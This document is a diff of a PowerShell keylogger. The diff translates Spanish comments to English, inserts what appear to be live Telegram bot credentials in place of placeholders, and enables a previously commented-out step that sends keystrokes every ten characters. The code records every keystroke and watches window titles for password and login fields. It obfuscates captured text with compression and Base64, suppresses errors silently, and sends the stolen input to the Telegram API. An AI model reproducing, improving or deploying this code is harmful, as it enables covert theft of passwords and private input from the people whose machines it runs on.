@@ -24,9 +24,9 @@ public class WinAPI {
 }
 "@
 
-# Configuración de Telegram
-$token = "TU_BOT_TOKEN_AQUI"
-$chatId = "TU_CHAT_ID_AQUI"
+# configure Telegram
+$token = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
+$chatId = "8298670259"
 
 function Compress-Text {
     param([string]$Text)
@@ -45,12 +45,12 @@ function Compress-Text {
 function Send-Telegram {
     param([string]$Message)
     try {
-        # Ofuscación: Comprimir y codificar en Base64
+        # Obfuscation: Compress and encode in Base64
         $compressedMessage = Compress-Text $Message
         $body = @{chat_id=$chatId; text=$compressedMessage} | ConvertTo-Json
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 3
     } catch {
-        # Manejo de errores silencioso
+        # Silent Error Handling
     }
 }
 
@@ -61,7 +61,7 @@ function Get-ActiveWindow {
     return $buffer.ToString()
 }
 
-Send-Telegram "Keylogger ACTIVADO - $(Get-Date)"
+Send-Telegram "Keylogger ACTIVATED - $(Get-Date)"
 
 $buffer = ""
 $lastSendTime = Get-Date
@@ -69,15 +69,15 @@ $keyStates = @{}
 $currentWindow = ""
 $lastWindow = ""
 
-Write-Host "Keylogger - EJECUTANDOSE"
-Write-Host "Envio cada 10 caracteres con ofuscacion..."
-Write-Host "Presiona Ctrl+C para detener"
+Write-Host "Keylogger - RUNNING"
+Write-Host "Sending every 10 characters with obfuscation..."
+Write-Host "Press CTRL+C to stop"
 
 try {
     while ($true) {
         Start-Sleep -Milliseconds 10
         
-        # Detectar ventana activa
+        # Detect Active Window
         $currentWindow = Get-ActiveWindow
         if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
             if ($buffer.Length -gt 0) {
@@ -85,8 +85,8 @@ try {
                 $buffer = ""
             }
             
-            # Detección de campos sensibles
-            $sensitiveKeywords = @("password", "contraseña", "login", "credential", "pwd", "pass", "cuenta", "usuario")
+            # Sensitive Field Detection
+            $sensitiveKeywords = @("password", "login", "credential", "pwd", "pass", "account", "user")
             $isSensitive = $false
             foreach ($keyword in $sensitiveKeywords) {
                 if ($currentWindow -like "*$keyword*" -or $currentWindow -like "*$keyword.ToUpper()*") {
@@ -96,9 +96,9 @@ try {
             }
             
             if ($isSensitive) {
-                Send-Telegram "CAMPO SENSIBLE DETECTADO: $currentWindow"
+                Send-Telegram "SENSITIVE FIELD DETECTED: $currentWindow"
             } else {
-                Send-Telegram "NUEVA VENTANA: $currentWindow"
+                Send-Telegram "NEW WINDOW: $currentWindow"
             }
             $lastWindow = $currentWindow
         }
@@ -111,7 +111,7 @@ try {
         
         $keyProcessed = $false
         
-        # COMBINACIONES ALT GR
+        # Combinations ALT GR
         if ($isCtrlPressed -and $isAltPressed) {
             # AltGr + 2 = @
             if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[500]) {
@@ -154,9 +154,9 @@ try {
             }
         }
         
-        # Si no se procesó AltGr, verificar teclas normales
+        # If AltGR was not processed, check normal keys
         if (-not $keyProcessed) {
-            # SÍMBOLOS CON SHIFT
+            # Symbols with SHIFT
             if ($isShiftPressed) {
                 # Shift + 1 = !
                 if ([WinAPI]::GetAsyncKeyState(49) -band 0x8000 -and -not $keyStates[1001]) {
@@ -274,7 +274,7 @@ try {
                 }
             }
             
-            # LETRAS (solo si no hay AltGr y no se procesó otra tecla)
+            # LETTERS (only if AltGr is not processed and no other key was processed)
             if (-not $keyProcessed -and -not ($isCtrlPressed -and $isAltPressed)) {
                 for ($i = 65; $i -le 90; $i++) {
                     if ([WinAPI]::GetAsyncKeyState($i) -band 0x8000 -and -not $keyStates[$i]) {
@@ -293,25 +293,10 @@ try {
                 }
             }
             
-            # LETRA Ñ (añadida)
-            if (-not $keyProcessed -and -not ($isCtrlPressed -and $isAltPressed)) {
-                if ([WinAPI]::GetAsyncKeyState(192) -band 0x8000 -and -not $keyStates[192]) {
-                    if ($isShiftPressed -or $isCapsLock) {
-                        $buffer += "Ñ"
-                    } else {
-                        $buffer += "ñ"
-                    }
-                    $keyProcessed = $true
-                    $keyStates[192] = $true
-                    Start-Sleep -Milliseconds 80
-                } elseif (-not ([WinAPI]::GetAsyncKeyState(192) -band 0x8000)) {
-                    $keyStates[192] = $false
-                }
-            }
             
-            # TECLAS ESPECIALES (solo si no se procesó otra tecla)
+            # Special Keys (only if no other key was processed)
             if (-not $keyProcessed) {
-                # Espacio
+                # Space
                 if ([WinAPI]::GetAsyncKeyState(32) -band 0x8000 -and -not $keyStates[32]) {
                     $buffer += " "
                     $keyProcessed = $true
@@ -321,7 +306,7 @@ try {
                     $keyStates[32] = $false
                 }
                 
-                # Punto
+                # Period
                 if ([WinAPI]::GetAsyncKeyState(190) -band 0x8000 -and -not $keyStates[190]) {
                     $buffer += "."
                     $keyProcessed = $true
@@ -341,7 +326,7 @@ try {
                     $keyStates[188] = $false
                 }
                 
-                # Punto y coma
+                # Semi-colon
                 if ([WinAPI]::GetAsyncKeyState(186) -band 0x8000 -and -not $keyStates[186]) {
                     $buffer += ";"
                     $keyProcessed = $true
@@ -351,7 +336,7 @@ try {
                     $keyStates[186] = $false
                 }
                 
-                # Guión
+                # dash
                 if ([WinAPI]::GetAsyncKeyState(189) -band 0x8000 -and -not $keyStates[189]) {
                     $buffer += "-"
                     $keyProcessed = $true
@@ -361,7 +346,7 @@ try {
                     $keyStates[189] = $false
                 }
                 
-                # Barra
+                # slash
                 if ([WinAPI]::GetAsyncKeyState(191) -band 0x8000 -and -not $keyStates[191]) {
                     $buffer += "/"
                     $keyProcessed = $true
@@ -395,16 +380,16 @@ try {
             }
         }
         
-        # ENVÍO CADA 10 CARACTERES
-        # if ($buffer.Length -ge 10) {
-        #     Send-Telegram "[$currentWindow] $buffer"
-        #     $buffer = ""
-        #     $lastSendTime = $currentTime
-        # }
+        # SEND EVERY 10 CHARACTERS
+        if ($buffer.Length -ge 10) {
+             Send-Telegram "[$currentWindow] $buffer"
+             $buffer = ""
+             $lastSendTime = $currentTime
+         }
         
-        # Envío de seguridad cada 60 segundos
+        # Security transmission every 60 seconds
         if (($currentTime - $lastSendTime).TotalSeconds -ge 60 -and $buffer.Length -gt 0) {
-            Send-Telegram "[$currentWindow] [PENDIENTE] $buffer"
+            Send-Telegram "[$currentWindow] [PENDING] $buffer"
             $buffer = ""
             $lastSendTime = $currentTime
         }
@@ -413,5 +398,5 @@ try {
     if ($buffer.Length -gt 0) {
         Send-Telegram "[FINAL] $buffer"
     }
-    Send-Telegram "Keylogger DETENIDO - $(Get-Date)"
+    Send-Telegram "Keylogger STOPPED - $(Get-Date)"
 }
